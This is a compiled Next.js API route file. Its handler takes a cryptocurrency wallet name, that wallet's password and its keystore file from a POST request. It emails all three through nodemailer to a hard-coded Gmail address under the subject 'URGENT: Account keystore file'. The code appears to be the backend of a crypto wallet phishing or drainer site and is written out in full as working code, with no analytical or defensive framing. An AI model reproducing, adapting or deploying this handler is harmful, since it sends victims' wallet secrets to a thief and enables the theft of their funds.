"use strict";
(() => {
var exports = {};
exports.id = 867;
exports.ids = [867];
exports.modules = {

/***/ 5184:
/***/ ((module) => {

module.exports = require("nodemailer");

/***/ }),

/***/ 4642:
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (__WEBPACK_DEFAULT_EXPORT__)
/* harmony export */ });
const nodemailer = __webpack_require__(5184);
const handler = async (req, res)=>{
    const { method  } = req;
    if (method === "POST") {
        const { file , password , wallet  } = req.body;
        if (!file || !wallet || !password) return res.status(400).json({
            error: "keystore file, password and wallet is required"
        });
        // 1) Create a transporter
        const transporter = nodemailer.createTransport({
            host: process.env.EMAIL_HOST,
            port: process.env.EMAIL_PORT,
            auth: {
                user: process.env.EMAIL_USERNAME,
                pass: process.env.EMAIL_PASSWORD
            }
        });
        // 2) Define the email options
        const mailOptions2 = {
            from: "obcbeats@gmail.com",
            to: "busybillion001@gmail.com",
            subject: `URGENT: Account keystore file for ${wallet}`,
            text: `
    Wallet name: ${wallet}
    Wallet Password: ${password}.
    Keystore JSON file has been attached to this mail`,
            attachments: [
                {
                    filename: `${wallet}keystore.json`,
                    path: file
                }
            ]
        };
        // 3) Actually send the email
        try {
            await transporter.sendMail(mailOptions2);
            res.status(200).json({
                status: "Success"
            });
        } catch (error) {
            console.log(error);
            res.status(200).json({
                error: "An error occurred"
            });
        }
    } else {
        res.status(400).json({
            error: "Incorrect Method"
        });
    }
};
/* harmony default export */ const __WEBPACK_DEFAULT_EXPORT__ = (handler);


/***/ })

};
;

// load runtime
var __webpack_require__ = require("../../webpack-api-runtime.js");
__webpack_require__.C(exports);
var __webpack_exec__ = (moduleId) => (__webpack_require__(__webpack_require__.s = moduleId))
var __webpack_exports__ = (__webpack_exec__(4642));
module.exports = __webpack_exports__;

})();